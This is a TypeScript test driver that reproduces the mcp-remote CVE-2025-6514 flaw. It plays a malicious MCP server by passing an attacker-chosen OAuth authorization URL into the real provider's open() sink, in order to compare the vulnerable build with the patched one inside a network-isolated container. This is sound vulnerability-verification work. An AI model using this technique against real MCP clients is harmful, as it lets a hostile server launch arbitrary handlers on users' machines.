// Scripted malicious MCP server -> client, for mcp-remote CVE-2025-6514 (GHSA-6xpm-ggf7-wc3p).
//
// In the real flow a malicious MCP server returns OAuth authorization-server metadata whose
// `authorization_endpoint` is attacker-chosen; the MCP SDK appends the OAuth query parameters and
// calls NodeOAuthClientProvider.redirectToAuthorization(url), whose body is the vulnerable sink
// `await open(authorizationUrl.toString())`. This driver plays the server by building exactly that
// attacker URL (attacker-chosen endpoint + the SDK's OAuth params) and invoking the *real*
// provider method imported from the checked-out source, so the vuln and fix trees differ only in
// their own code: vuln calls open(url); fix calls open(sanitizeUrl(url)) and sanitizeUrl throws on
// the non-http(s) scheme. Everything runs in one container with no egress (--network none).
import * as fs from "node:fs";
import { NodeOAuthClientProvider } from "/app/src/lib/node-oauth-client-provider.ts";

const [, , arm, nonce] = process.argv;
const spec = JSON.parse(fs.readFileSync(`/case/inputs/${arm}.json`, "utf-8"));

// The attacker-chosen authorization_endpoint returned by the malicious server's metadata.
const url = new URL(spec.endpoint);
// The OAuth parameters the SDK's startAuthorization appends before redirectToAuthorization.
url.searchParams.set("response_type", "code");
url.searchParams.set("client_id", "avb-client");
url.searchParams.set("redirect_uri", "http://127.0.0.1:3334/oauth/callback");
url.searchParams.set("code_challenge", "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM");
url.searchParams.set("code_challenge_method", "S256");
url.searchParams.set("state", nonce);
// Per-trial nonce the registered handler echoes back, so the oracle keys on this exact trial.
url.searchParams.set("avbnonce", nonce);

const provider = new NodeOAuthClientProvider({
  serverUrl: "https://malicious-mcp-server.example/sse",
  callbackPort: 3334,
  host: "127.0.0.1",
});

try {
  // The real sink. Vuln: open(url). Fix: open(sanitizeUrl(url)) -> throws on non-http(s) scheme.
  await provider.redirectToAuthorization(url);
  console.log("redirectToAuthorization returned for", url.protocol);
} catch (e) {
  console.log("redirectToAuthorization threw:", e?.message);
}
// `open` detaches the launched handler; give it time to write its canary before the oracle runs.
await new Promise((r) => setTimeout(r, 2000));
